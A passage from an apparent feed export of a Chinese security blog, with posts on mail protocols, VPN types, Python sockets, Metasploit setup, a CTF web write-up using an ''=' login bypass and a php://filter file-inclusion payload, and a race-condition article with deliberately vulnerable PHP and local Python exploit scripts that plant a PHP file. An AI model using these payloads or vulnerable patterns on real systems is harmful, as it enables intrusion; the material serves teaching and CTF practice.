        &lt;!--markdown--&gt;第一题:calc&lt;br&gt;&lt;br&gt;calc看样子是命令执行&lt;br&gt;通过n次尝试，成功执行代码&lt;br&gt;&lt;img src=&quot;http://118.126.66.150/52sec/08/3324016975.png&quot; alt=&quot;W))I3(_DS[0$}G
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>[读书笔记] mail理论</title>
    <link href="https://vuln.top/2019/02/21/57/"/>
    <id>https://vuln.top/2019/02/21/57/</id>
    <published>2019-02-21T04:16:28.569Z</published>
    <updated>2019-02-23T15:25:24.667Z</updated>
    
    <content type="html"><![CDATA[<!--markdown-->很久之前的笔记整理下<br><br>MX代表的是MaileXchange，当一封邮件要发送出去的时候，邮件主机会先分析那封信的目标的DNS 先取得MX标志（注意 MX标志可能会有多部主机)然后以最优先MX主机为准将信发送出去<br><br>我们熟悉的outlook、foxmail等都是用来收信和发信的，称之为MUA:mail user agent，邮件用户代理<br><br>MUA并非直接将邮件发送至收件人手中，而是通过MTA:Mail Transfer Agent，邮件传输代理代传递，sendmail和postfix就是扮演MTA的角色<br><br>一封邮件的流程是：<br>发件人：<figure class="highlight plain"><figcaption><span>MTA --> 若干个MTA -> MTA -> MDA <-- 收取 --mua:收件人```< span></--></span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">MUA到MTA,以及MTA到MTA之间使用的协议就是SMTP协议，而收邮件时，MUA到MDA之间使用的协议是最常用的POP3或IMAP。</span><br></pre></td></tr></table></figure><p>MUA: 用户代理端，即用户使用的写信、收信客户端软件<br>MTA:邮件传送端，即常说的邮件服务器，用于转发、收取用户邮件<br>MDA:邮件代理端，相当于MUA和MTA的中间人，可用于过滤垃圾邮件<br>POP:邮局协议，用于MUA连接服务器收取用户邮件，通讯端口110<br>IMOP:互联网应用协议，功能较多POP多，通信端口143<br>SMTP:简单邮件传送协议，MUA连接MTA或MTA连接MTA发送邮件使用此协议，通讯端口25<br><code>`</code><br><img src="http://118.126.66.150/52sec/08/3640427257.gif" alt="mail-flow.gif"></p><p>1）发信端于收信端两台主机间会经过一个握手（ehlo）的阶段，此时发信端会被记录为发信来源<br>（而不是mail from）。通过握手后就可以进行邮件标题（header）的传送<br>2）此时收信端主机会分析标题的信息，若邮件的“mail to:主机名”为收信端主机，且该名称符合mydestination的设置，则该邮件会开始被接受到队列，并进一步送到mailbox当中；若不符合mydestination<br>的设置，则终止连接且不会进行邮件内容的传送<br>3）若“mail to：主机名“不是收信端本身，则开始进行中继转发（relay）的分析<br>4）转发过程首先分析该邮件的来源是否符合信任的客户端<br>5）分析邮件来源或目标是否符合relay_domains的设置，若符合则邮件将接受至队列，并等待MDA将邮件再转发出去<br>6）若这封邮件的标题数据都不符合上述的规范，则终止连接，并不会接受邮件的内容数据。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;!--markdown--&gt;很久之前的笔记整理下&lt;br&gt;&lt;br&gt;MX代表的是MaileXchange，当一封邮件要发送出去的时候，邮件主机会先分析那封信的目标的DNS 先取得MX标志（注意 MX标志可能会有多部主机)然后以最优先MX主机为准将信发送出去&lt;br&gt;&lt;br&gt;我们熟悉的
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>vpn几种类型优缺点</title>
    <link href="https://vuln.top/2019/02/21/58/"/>
    <id>https://vuln.top/2019/02/21/58/</id>
    <published>2019-02-21T04:04:07.167Z</published>
    <updated>2019-02-21T04:04:07.180Z</updated>
    
    <content type="html"><![CDATA[<h2 id="PPTP"><a href="#PPTP" class="headerlink" title="PPTP"></a><!--markdown-->PPTP</h2><p>PPTP(Point-to-Point Tunneling Protocol，点对点隧道协议)是由微软为了在拨号网络方面创建VPN而成立的一个团队开发而生，因此长期以来一直都是其企业内部的VPN标准协议。它也是一个通过搭配各种认证方法（通常是MS-CHAP v2）以提供安全性的VPN协议。因为PPTP协议作为一个在几乎所有有VPN能力的平台和设备上都可以无需安装额外软件而使用的标准，它至今仍然是企业和VPN供应商们的热门选择。同时，它有着低计算开销即可实现的优势（通俗地说就是运行速度很快）。<br>    • 几乎所有平台都内置好了PPTP协议的VPN客户端<br>    • 非常易于搭建<br>    • 不够安全（弱势的MSCHAPv2依旧被广泛使用）<br>    • 绝对妥协于NSA</p><h2 id="L2TP-以及-L2TP-IPsec"><a href="#L2TP-以及-L2TP-IPsec" class="headerlink" title="L2TP 以及 L2TP/IPsec"></a>L2TP 以及 L2TP/IPsec</h2><p>L2TP(Layer 2 Tunnel Protocol，第二层隧道协议)是一种协议本身不对通过的流量进行加密或实施保密措施的VPN协议。也正是因为这个原因，L2TP通常会结合IPsec加密套件（如下所述，类似于一种密码）来实现，以此提供安全性和隐私性。<br>L2TP/IPsec已经被内置于所有现代化操作系统以及具有VPN功能的设置，同时它也如PPTP一般，操作简单、可快速搭建（实际上它与PPTP使用的设备通常也是相同的）。<br>L2tp/IPsec会进行两次数据封装，这似乎会让速度慢下来。不过首先，它的加密解密行为发生在内核之中，其次LwTP/IPsec也允许多线程（OpenVPN并没有这个功能），这两点完全可以将两次数据封装造成的减速抵消掉，结果是L2TP在理论上会比OpenVPN更快。<br>    • 通常公认其安全<br>    • 易于搭建<br>    • 适用于全部现代化平台<br>    • 较OpenVPN更快<br>    • 或许已经向NSA妥协了（但未被证实）<br>    • 或许被NSA故意削弱过（但未被证实）<br>    • 会跟限制性防火墙产生冲突</p><h2 id="OpenVPN"><a href="#OpenVPN" class="headerlink" title="OpenVPN"></a>OpenVPN</h2><p>OpenVPN可以说是一种崭新的开源技术，它使用了OpenSSL库和SSLv3/TLSv1协议，通过与其他的技术融为一体，来提供一个强大而可靠的VPN解决方案。<br>    • 高度可配置性<br>    • 非常安全（如果使用了PFS完全正向加密，甚至对NSA都是安全的）<br>    • 可以绕过防火墙<br>    • 可以使用多种加密算法<br>    • 开源（因此可以很容易地去检查项目中的后门情况或者其他有可能被NSA修改过的地方）<br>    • 需要第三方软件<br>    • 安装过程比较繁琐<br>    • 尽管在努力改善对移动端设备的支持，缺还是不及桌面端的完善程度</p><h2 id="SSTP"><a href="#SSTP" class="headerlink" title="SSTP"></a>SSTP</h2><p>SSTP（Secure Socket Tunneling Protocol，安全套接字隧道协议）是微软在Windows Vista SP1时推出的，虽然它现在可用于Linux、RouterOS和SEIL，但是它极大程度上还是一种仅限Windows平台的协议（让它支持苹果设备的可能性等同于地狱里面出现了一个雪球）。<br>    • 非常安全（这取决于加密方式，不过通常使用AES就非常强大了）<br>    • 完全集成到了Windows操作系统中（Windows Vista SP1, Windows 7, Windows 8）<br>    • 微软官方支持<br>    • 可以绕过大多数防火墙<br>    • 只有在Windows环境才能真正工作<br>    • 作为微软的专有标准，不能被独立核查出后门以及其他问题</p><h2 id="IKEv2"><a href="#IKEv2" class="headerlink" title="IKEv2"></a>IKEv2</h2><p>IKEv2（Internet Key Exchange version 2，因特网密钥交换版本2）基于IPSec隧道协议，由微软和思科联合开发，并被兼并到了Windows7及以上版本中。<br>IKEv2有着非常实用的自动重连特性，当用户暂时失去互联网连接（比如进出火车隧道）的时候，它会自动重新建立VPN连接。对于手机用户来说确实是喜大普奔。Ikev2能跑在几乎所有iOS定制的VPN应用上，为了那些使用苹果公司官方VPN API的人无需越狱来使用它（也正因为这些优势，能让VPN供应商能够很容易地把更新配置文件推送到使用VPN的用户或者应用程序上）。<br>    • 比PPTP，SSTP和L2TP更快，它不涉及在点对点协议（Point-to-Point protocols，PPP）上的开销<br>    • 非常稳定 - 尤其是切换网络或者在短暂的网络连接丢失之后重新连接的时候<br>    • 非常安全 - 支持AES 128，AES 192，AES 256以及3DES加密算法<br>    • 易于安装和配置 - 至少在用户端是如此<br>    • 协议也支持黑莓的设备<br>    • 暂时还不支持很多的平台<br>    • 在服务器上搭建IKEv2相对来说很费劲，这也是很多问题的隐患所在 我们所对它的信任仅因为它进行了开源</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;PPTP&quot;&gt;&lt;a href=&quot;#PPTP&quot; class=&quot;headerlink&quot; title=&quot;PPTP&quot;&gt;&lt;/a&gt;&lt;!--markdown--&gt;PPTP&lt;/h2&gt;&lt;p&gt;PPTP(Point-to-Point Tunneling Protocol，点对点隧道协议)
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>python socket 用法</title>
    <link href="https://vuln.top/2019/02/21/10/"/>
    <id>https://vuln.top/2019/02/21/10/</id>
    <published>2019-02-21T04:02:42.005Z</published>
    <updated>2019-02-21T04:02:42.017Z</updated>
    
    <content type="html"><![CDATA[<p><!--markdown-->1、Socket 类型<br>套接字格式：<br>socket(family,type[,protocal]) 使用给定的地址族、套接字类型、协议编号（默认为0）来创建套接字。</p><p>socket类型    描述<br>socket.AF_UNIX    只能够用于单一的Unix系统进程间通信<br>socket.AF_INET    服务器之间网络通信<br>socket.AF_INET6    IPv6<br>socket.SOCK_STREAM    流式socket , for TCP<br>socket.SOCK_DGRAM    数据报式socket , for UDP<br>socket.SOCK_RAW    原始套接字，普通的套接字无法处理ICMP、IGMP等网络报文，而SOCK_RAW可以；其次，SOCK_RAW也可以处理特殊的IPv4报文；此外，利用原始套接字，可以通过IP_HDRINCL套接字选项由用户构造IP头。<br>socket.SOCK_SEQPACKET    可靠的连续数据包服务<br>创建TCP Socket：    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)<br>创建UDP Socket：    s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)</p><p>2、Socket 函数<br>注意点:<br>1）TCP发送数据时，已建立好TCP连接，所以不需要指定地址。UDP是面向无连接的，每次发送要指定是发给谁。<br>2）服务端与客户端不能直接发送列表，元组，字典。需要字符串化repr(data)。</p><p>socket函数        描述<br>服务端socket函数<br>s.bind(address)    将套接字绑定到地址, 在AF_INET下,以元组（host,port）的形式表示地址.<br>s.listen(backlog)    开始监听TCP传入连接。backlog指定在拒绝连接之前，操作系统可以挂起的最大连接数量。该值至少为1，大部分应用程序设为5就可以了。<br>s.accept()    接受TCP连接并返回（conn,address）,其中conn是新的套接字对象，可以用来接收和发送数据。address是连接客户端的地址。<br>客户端socket函数<br>s.connect(address)    连接到address处的套接字。一般address的格式为元组（hostname,port），如果连接出错，返回socket.error错误。<br>s.connect_ex(adddress)    功能与connect(address)相同，但是成功返回0，失败返回errno的值。<br>公共socket函数<br>s.recv(bufsize[,flag])    接受TCP套接字的数据。数据以字符串形式返回，bufsize指定要接收的最大数据量。flag提供有关消息的其他信息，通常可以忽略。<br>s.send(string[,flag])    发送TCP数据。将string中的数据发送到连接的套接字。返回值是要发送的字节数量，该数量可能小于string的字节大小。<br>s.sendall(string[,flag])    完整发送TCP数据。将string中的数据发送到连接的套接字，但在返回之前会尝试发送所有数据。成功返回None，失败则抛出异常。<br>s.recvfrom(bufsize[.flag])    接受UDP套接字的数据。与recv()类似，但返回值是（data,address）。其中data是包含接收数据的字符串，address是发送数据的套接字地址。<br>s.sendto(string[,flag],address)    发送UDP数据。将数据发送到套接字，address是形式为（ipaddr，port）的元组，指定远程地址。返回值是发送的字节数。<br>s.close()    关闭套接字。<br>s.getpeername()    返回连接套接字的远程地址。返回值通常是元组（ipaddr,port）。<br>s.getsockname()    返回套接字自己的地址。通常是一个元组(ipaddr,port)<br>s.setsockopt(level,optname,value)    设置给定套接字选项的值。<br>s.getsockopt(level,optname[.buflen])    返回套接字选项的值。<br>s.settimeout(timeout)    设置套接字操作的超时期，timeout是一个浮点数，单位是秒。值为None表示没有超时期。一般，超时期应该在刚创建套接字时设置，因为它们可能用于连接的操作（如connect()）<br>s.gettimeout()    返回当前超时期的值，单位是秒，如果没有设置超时期，则返回None。<br>s.fileno()    返回套接字的文件描述符。<br>s.setblocking(flag)    如果flag为0，则将套接字设为非阻塞模式，否则将套接字设为阻塞模式（默认值）。非阻塞模式下，如果调用recv()没有发现任何数据，或send()调用无法立即发送数据，那么将引起socket.error异常。<br>s.makefile()    创建一个与该套接字相关连的文件<br>3、socket编程思路<br>TCP服务端：<br>1 创建套接字，绑定套接字到本地IP与端口</p><h1 id="socket-socket-socket-AF-INET-socket-SOCK-STREAM-s-bind"><a href="#socket-socket-socket-AF-INET-socket-SOCK-STREAM-s-bind" class="headerlink" title="socket.socket(socket.AF_INET,socket.SOCK_STREAM) , s.bind()"></a>socket.socket(socket.AF_INET,socket.SOCK_STREAM) , s.bind()</h1><p>2 开始监听连接                   #s.listen()<br>3 进入循环，不断接受客户端的连接请求              #s.accept()<br>4 然后接收传来的数据，并发送给对方数据         #s.recv() , s.sendall()<br>5 传输完毕后，关闭套接字                     #s.close()</p><p>TCP客户端:<br>1 创建套接字，连接远端地址</p><pre><code># socket.socket(socket.AF_INET,socket.SOCK_STREAM) , s.connect()</code></pre><p>2 连接后发送数据和接收数据          # s.sendall(), s.recv()<br>3 传输完毕后，关闭套接字          #s.close()</p><p>来自 <a href="http://blog.csdn.net/rebelqsp/article/details/22109925" target="_blank" rel="noopener">http://blog.csdn.net/rebelqsp/article/details/22109925</a> </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;!--markdown--&gt;1、Socket 类型&lt;br&gt;套接字格式：&lt;br&gt;socket(family,type[,protocal]) 使用给定的地址族、套接字类型、协议编号（默认为0）来创建套接字。&lt;/p&gt;
&lt;p&gt;socket类型    描述&lt;br&gt;socket.A
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>mac上msf配置环境的坑</title>
    <link href="https://vuln.top/2019/02/21/116/"/>
    <id>https://vuln.top/2019/02/21/116/</id>
    <published>2019-02-21T04:02:20.086Z</published>
    <updated>2019-02-23T15:13:48.063Z</updated>
    
    <content type="html"><![CDATA[<p><!--markdown-->本来今天是准备用msf大干一场的结果发现msf炸了炸了！！！ ::aru:knife:: </p><p>不知道是不是因为更新了一波系统才炸的。</p><p>一开始是一个ruby版本的问题需要升级到ruby2.5.1</p><p>通过这条命令解决了:<code>rvm install 2.5.1 --with-openssl-dir=/usr/local/opt/openssl/bin/openssl</code></p><p><code>rm -f Gemfile.lock</code>切换到root模式下先把这玩意删了不然会有缓存</p><p>然后运行<code>bundle installl</code>后发现发现还要安装 nokogiri -v 1.8.4<br><img src="http://118.126.66.150/52sec/09/1834762529.png" alt="FA9695F6-E4F9-4A80-B6B8-994D5A7F42E3.png"></p><p>本想着通过gem能直接安装的后来发现我想多了，上帝不想让我睡觉（搞不完睡不着系列）。</p><p><img src="http://118.126.66.150/52sec/09/1799662772.png" alt="70E6E2F643BA40264AD030CD5B1A89DA.png"></p><p>我一开始尝试换源，终端走代理都不行，后来查出来发现是我gem的源。。换域名了。。。。(这个错我找了好久)</p><p><img src="http://118.126.66.150/52sec/09/1687912826.png" alt="2C908519-6A4C-49BD-90AD-BD009AD517CE.png"></p><p><code>gem sources --add https://gems.ruby-china.com/</code> #添加<br><code>gem sources -l</code>#查看<br><code>gem update --system</code> #更新</p><p><code>gem install bundle</code> #需要重新安装一遍<br><code>bundle install</code><br><img src="http://118.126.66.150/52sec/09/180492618.png" alt="D961E278-3388-47E7-B9AF-945470C66DA9.png"><br>都是原谅绿的就很开心…<br><img src="http://118.126.66.150/52sec/09/2876334475.png" alt="E2611118-8F9B-43A4-BABF-3C02EB5A76A1.png"></p><p>其实中间还有蛮多坑的但是我没保存下来就过了很可惜，写这篇文章主要是为了水一贴，顺便记录一下。</p><p>好晚了睡觉觉去了 ::aru:pouting:: </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;!--markdown--&gt;本来今天是准备用msf大干一场的结果发现msf炸了炸了！！！ ::aru:knife:: &lt;/p&gt;
&lt;p&gt;不知道是不是因为更新了一波系统才炸的。&lt;/p&gt;
&lt;p&gt;一开始是一个ruby版本的问题需要升级到ruby2.5.1&lt;/p&gt;
&lt;p&gt;通过这条命
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>记录下一道web题</title>
    <link href="https://vuln.top/2019/02/21/124/"/>
    <id>https://vuln.top/2019/02/21/124/</id>
    <published>2019-02-21T04:00:22.849Z</published>
    <updated>2019-02-23T15:14:20.326Z</updated>
    
    <content type="html"><![CDATA[<p><!--markdown-->题目名:真假难辨<br>点击页面的时候我发现这个页面没有表单。。<br><img src="http://118.126.66.150/52sec/10/488159467.png" alt="3B724733-D6B0-47F8-850A-5649E9161A10.png"><br>习惯性的扫了下目录文件<br>发现有一个.test.php.swp</p><p><img src="http://118.126.66.150/52sec/10/1807292108.png" alt="1A5BE925-BEAF-46D1-9812-E66357A912F2.png"><br><img src="http://118.126.66.150/52sec/10/1796908624.png" alt="E89D4D93-F91D-4CD3-95F6-DA70F6726B98.png"><br>发现mysql账号密码<br>一开始以为是构造表单提交到test.php里<br>但是后来发现没啥用,没错我就说着玩的…<br><img src="http://118.126.66.150/52sec/10/4172375584.png" alt="55179070-A281-40C9-92D8-D76AA9BDD339.png"><br>没办法get下index.php，发现有个hint访问index22222.php,这个才是真正的页面和原来页面长得一样,但是可以递交<br>我估计是万能密码sqlmap跑了下还真跑到了<br><img src="http://118.126.66.150/52sec/10/3249539132.png" alt="F1A78C66-CB2E-4647-B175-002F0357FCAB.png"><br>但是数据库,本地文件读取,什么的什么都没有权限,我在这上面弄了好久.<br>只能手工构造万能密码<br>过滤了<code>or,and,select</code>等…<br>最后试到<br><img src="http://118.126.66.150/52sec/10/3505957255.png" alt="507B8FEC-CA73-4AD3-A3C0-768B6FCEB76D.png"><br><code>&#39;&#39;=&#39;</code>成功绕过…<br><img src="http://118.126.66.150/52sec/10/161917790.png" alt="6D0584E7-5F95-45DA-B708-A8240987D66B.png"><br>后面就比较简单了闭着眼睛都知道是文件包含,用<code>php://filter</code>成功绕过<br>i&gt; php://filter/read=convert.base64-encode/resource=flag123456789.php</p><p><img src="http://118.126.66.150/52sec/10/1227329903.png" alt="5D1EEF8D-0C1E-48A5-9F05-B7EC51C47EAD.png"><br>解开base64获得flag<br>说实话不难,但是考了好几个知识点万能密码绕过waf,php伪协议文件包含</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;!--markdown--&gt;题目名:真假难辨&lt;br&gt;点击页面的时候我发现这个页面没有表单。。&lt;br&gt;&lt;img src=&quot;http://118.126.66.150/52sec/10/488159467.png&quot; alt=&quot;3B724733-D6B0-47F8-850A-5
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Web中的条件竞争漏洞</title>
    <link href="https://vuln.top/2019/02/21/164/"/>
    <id>https://vuln.top/2019/02/21/164/</id>
    <published>2019-02-21T03:57:27.827Z</published>
    <updated>2019-02-21T03:57:27.839Z</updated>
    
    <content type="html"><![CDATA[<!--markdown-->来源于：<a href="http://seaii-blog.com/index.php/2017/04/26/49.html" target="_blank" rel="noopener">http://seaii-blog.com/index.php/2017/04/26/49.html</a><br>0x01前言<br>放假回家前更一篇~ 之前做xctf联赛的时候多次碰到了这种类型的题目，之前没有好好了解过，被虐了很多次之后终于下定决心来仔细研究了解一波这个漏洞。。。<br><br>0x02漏洞成因<br>首先了解一个定义——竞争条件是什么？<br><br>竞争条件”发生在多个线程同时访问同一个共享代码、变量、文件等没有进行锁操作或者同步操作的场景中。 ——Wikipedia-computer_science<br><br>开发者在进行代码开发时常常倾向于认为代码会以线性的方式执行，而且他们忽视了并行服务器会并发执行多个线程，这就会导致意想不到的结果。<br><br>线程同步机制确保两个及以上的并发进程或线程不同时执行某些特定的程序段，也被称之为临界区（critical section），如果没有应用好同步技术则会发生“竞争条件”问题。在我理解就是两只哈士奇（线程）同时去抢一个丢出去的飞盘（资源），不知道到底哪只能抢到，此处便形成了竞争。<br><br>0x03漏洞测试<br>只是干巴巴的说些定义可能对这个漏洞的理解不够透彻，最简单直接的方法还是自己用代码来测试一下。<br>现在我们模拟一个转账的情景<br><img src alt>前端水平有限，就是用来展示结果的，不要在意细节。。。。<br>后端处理代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">    $db = new mysqli(&apos;localhost&apos;, &apos;&apos;, &apos;&apos;, &apos;&apos;);</span><br><span class="line">    $sql = &quot;SELECT rest FROM account&quot;;</span><br><span class="line">    $rest = intval($db-&gt;query($sql)-&gt;fetch_assoc()[&apos;rest&apos;]);</span><br><span class="line">    </span><br><span class="line">    $sql = &quot;SELECT own FROM account&quot;;</span><br><span class="line">    $own = intval($db-&gt;query($sql)-&gt;fetch_assoc()[&apos;own&apos;]);</span><br><span class="line"></span><br><span class="line">    if ($_SERVER[&quot;REQUEST_METHOD&quot;] == &quot;GET&quot;) &#123;</span><br><span class="line">        $result = array(</span><br><span class="line">            &quot;rest&quot; =&gt; $rest,</span><br><span class="line">            &quot;own&quot;  =&gt; $own,</span><br><span class="line">        );</span><br><span class="line">        echo json_encode($result);</span><br><span class="line">    &#125; elseif ($_SERVER[&quot;REQUEST_METHOD&quot;] == &quot;POST&quot;)&#123;</span><br><span class="line">        $money = intval($_POST[&apos;money&apos;]);</span><br><span class="line">        if($money &lt;= $rest) &#123;</span><br><span class="line">            $result = array(</span><br><span class="line">                &quot;status&quot; =&gt; &quot;success&quot;,</span><br><span class="line">                &quot;rest&quot;   =&gt; $rest - $money,</span><br><span class="line">                &quot;own&quot;    =&gt; $own  + $money, </span><br><span class="line">            );</span><br><span class="line">            echo json_encode($result);</span><br><span class="line"></span><br><span class="line">            $sql = &quot;UPDATE account SET rest=rest-&quot;.$money;</span><br><span class="line">            //$sql = &quot;UPDATE account SET rest=&quot;.$result[&apos;rest&apos;];</span><br><span class="line">            $db-&gt;query($sql);</span><br><span class="line"></span><br><span class="line">            $sql = &quot;UPDATE account SET own=own+&quot;.$money;</span><br><span class="line">            //$sql = &quot;UPDATE account SET own=&quot;.$result[&apos;own&apos;];</span><br><span class="line">            $db-&gt;query($sql);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $result = array(</span><br><span class="line">                &quot;status&quot; =&gt; &quot;failed&quot;,</span><br><span class="line">                &quot;rest&quot;   =&gt; $rest,</span><br><span class="line">                &quot;own&quot;    =&gt; $own,</span><br><span class="line">            );</span><br><span class="line">            echo json_encode($result);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> ?&gt;</span><br></pre></td></tr></table></figure><p>配合前端ajax写的，后来测试中发现前端页面完全没用到23333333<br>使用py模拟转账操作，代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line">import queue</span><br><span class="line"></span><br><span class="line">url = &quot;http://127.0.0.1/race_condition.php&quot;</span><br><span class="line">threads = 25</span><br><span class="line">q = queue.Queue()</span><br><span class="line"></span><br><span class="line">for i in range(50):</span><br><span class="line">    q.put(i)</span><br><span class="line"></span><br><span class="line">def post():</span><br><span class="line">    while not q.empty():</span><br><span class="line">        q.get()</span><br><span class="line">        r = requests.post(url, data=&#123;&apos;money&apos;: 1&#125;)</span><br><span class="line">        print(r.text)</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    for i in range(threads):</span><br><span class="line">        t = threading.Thread(target=post)</span><br><span class="line">        t.start()</span><br><span class="line"></span><br><span class="line">    for i in range(threads):</span><br><span class="line">        t.join()</span><br></pre></td></tr></table></figure></p><p>因为这个漏洞很受环境因素的影响，比如网络延迟、服务器的处理能力等，所以只执行一次可能并不会成功，尝试几次后意想不到的结果还是发生了。。。<br><img src alt></p><p>由于多线程访问，数据库update一次的时间内update了多次，导致数据出现错误，这在银行、电商等有支付的地方影响是巨大的。</p><p>0x03漏洞实战<br>要找个实战还真是不容易，在网上翻了半天只找到几个比较老的漏洞，一般会将其归为逻辑漏洞。看了一下套路都差不多，我简化了一下步骤，代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $allowtype = array(&quot;gif&quot;,&quot;png&quot;,&quot;jpg&quot;);</span><br><span class="line">    $size = 10000000;</span><br><span class="line">    $path = &quot;./&quot;;</span><br><span class="line"></span><br><span class="line">    $filename = $_FILES[&apos;myfile&apos;][&apos;name&apos;];</span><br><span class="line"></span><br><span class="line">    if (is_uploaded_file($_FILES[&apos;myfile&apos;][&apos;tmp_name&apos;]))&#123;</span><br><span class="line">        if (!move_uploaded_file($_FILES[&apos;myfile&apos;][&apos;tmp_name&apos;],$path.$filename))&#123;</span><br><span class="line">            die(&quot;error:can not move!&quot;);</span><br><span class="line">        &#125;   </span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        die(&quot;error:not an upload file！&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $newfile = $path.$filename;</span><br><span class="line">    echo &quot;file upload success.file path is: &quot;.$newfile.&quot;\n&lt;br /&gt;&quot;;</span><br><span class="line"></span><br><span class="line">    if ($_FILES[&apos;myfile&apos;][&apos;error&apos;] &gt; 0)&#123;</span><br><span class="line">        unlink($newfile);</span><br><span class="line">        die(&quot;Upload file error: &quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $ext = array_pop(explode(&quot;.&quot;,$_FILES[&apos;myfile&apos;][&apos;name&apos;]));</span><br><span class="line">    if (!in_array($ext,$allowtype))&#123;</span><br><span class="line">        unlink($newfile);</span><br><span class="line">        die(&quot;error:upload the file type is not allowed，delete the file！&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>简单解释一下，首先将文件上传到服务器，然后检测文件后缀名，如果不符合条件，就删掉，典型的“引狼入室”。<br>我们的利用思路是这样的，首先上传一个php文件，内容为：</p><figure class="highlight plain"><figcaption><span>fputs(fopen("info.php", "w"), "<?php phpinfo(); ?>"); ?>```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">当然这个文件会被立马删掉，所以我们使用多线程并发的访问上传的文件，总会有一次在上传文件到删除文件这个时间段内访问到上传的php文件，一旦我们成功访问到了上传的文件，那么它就会向服务器写一个shell。利用代码如下：</span><br></pre></td></tr></table></figure><p>import requests<br>import threading<br>import os</p><p>class RaceCondition(threading.Thread):<br>    def <strong>init</strong>(self):<br>        threading.Thread.<strong>init</strong>(self)</p><pre><code>    self.url = &apos;http://127.0.0.1/a.php&apos;    self.uploadUrl = &apos;http://127.0.0.1/race.php&apos;def _get(self):    print(&apos;try to call uploaded file...&apos;)    r = requests.get(self.url)    if r.status_code == 200:        print(&apos;[*] create file info.php success.&apos;)        os._exit(0)def _upload(self):    print(&apos;upload file...&apos;)    file = {&apos;myfile&apos;: open(&apos;a.php&apos;, &apos;r&apos;)}    requests.post(self.uploadUrl, files=file)def run(self):    while True:        for i in range(5):            self._get()        for i in range(10):            self._upload()            self._get()</code></pre><p>if <strong>name</strong> == ‘<strong>main</strong>‘:<br>    threads = 50    </p><pre><code>for i in range(threads):    t = RaceCondition()    t.start()for i in range(threads):    t.join()</code></pre><p>经过几次尝试，成功得到了shell。<br><code>`</code></p><p>0x04漏洞防御<br>对于数据库的操作，正牌的方法是设置锁，这个之后还要仔细研究一下。<br>对于文件上传，一定要经过充分完整的检查之后再上传，不要玩花样。。。<br>在操作系统的角度，共享数据要进行上锁保护（互斥？同步？）</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;!--markdown--&gt;来源于：&lt;a href=&quot;http://seaii-blog.com/index.php/2017/04/26/49.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://seaii-blog.com/index.p
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>豌豆杯入学ctf</title>
